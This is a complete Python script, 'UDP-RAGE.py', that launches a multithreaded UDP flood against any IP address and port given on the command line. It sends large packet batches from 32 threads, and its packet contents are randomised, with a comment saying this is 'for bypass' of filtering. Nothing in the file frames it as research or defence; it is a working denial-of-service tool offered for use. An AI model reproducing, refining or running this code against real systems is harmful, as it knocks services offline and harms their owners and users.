import socket
import sys
import time
import random
import threading

class UDPFlooder:
    def __init__(self, target_ip, port, duration):
        self.target_ip = target_ip
        self.port = port
        self.duration = duration
        self.packet_size = 1450
        self.num_threads = 32
        self.batch_size = 500
        self.running = True
        
    def create_socket(self):
        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        sock.setsockopt(socket.SOL_SOCKET, socket.SO_SNDBUF, 1024 * 1024 * 20)
        return sock

    def generate_packets(self, count=100):
        packets = []
        for _ in range(count):
            # Varied packet patterns for bypass
            pattern = random.choice([b'\x00', b'\xFF', b'\xAA', b'\x55'])
            base_packet = pattern * self.packet_size
            # Randomize parts of the packet
            rand_pos = random.randint(0, self.packet_size - 100)
            rand_data = random.randbytes(100)
            final_packet = bytearray(base_packet)
            final_packet[rand_pos:rand_pos+100] = rand_data
            packets.append(bytes(final_packet))
        return packets

    def flood_worker(self, worker_id):
        try:
            sock = self.create_socket()
            packets = self.generate_packets()
            
            start_time = time.time()
            packet_count = 0
            
            while self.running and time.time() - start_time < self.duration:
                # Batch sending with varied packets
                for i in range(self.batch_size):
                    if not self.running:
                        break
                    packet = packets[(packet_count + i) % len(packets)]
                    sock.sendto(packet, (self.target_ip, self.port))
                packet_count += self.batch_size
                
        except Exception:
            pass
        finally:
            try:
                sock.close()
            except:
                pass

    def start(self):
        print(f"Starting UDP flood on {self.target_ip}:{self.port}")
        print(f"Duration: {self.duration}s | Threads: {self.num_threads}")
        
        threads = []
        for i in range(self.num_threads):
            thread = threading.Thread(target=self.flood_worker, args=(i,), daemon=True)
            threads.append(thread)
            thread.start()
        
        try:
            time.sleep(self.duration)
        except KeyboardInterrupt:
            print("\nStopping...")
        finally:
            self.running = False
            for thread in threads:
                thread.join(timeout=1)
            
        print("Attack completed")

def main():
    if len(sys.argv) != 4:
        print("Usage: python3 UDP-RAGE.py <IP> <PORT> <DURATION>")
        return 1

    target_ip = sys.argv[1]
    port = int(sys.argv[2])
    duration = int(sys.argv[3])

    flooder = UDPFlooder(target_ip, port, duration)
    flooder.start()
    return 0

if __name__ == "__main__":
    sys.exit(main())
